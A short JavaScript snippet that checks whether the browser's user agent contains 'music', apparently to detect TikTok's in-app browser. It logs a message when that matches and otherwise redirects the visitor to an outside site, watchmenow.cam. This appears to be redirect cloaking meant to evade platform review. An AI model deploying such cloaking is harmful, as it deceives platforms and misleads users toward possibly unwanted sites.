let agent = navigator.userAgent;

if (agent.indexOf('music') >= 0) {
  console.log('in tiktok app');
} else {
  window.location = 'https://watchmenow.cam/vid';
}
// document.querySelector('body').innerText = agent;
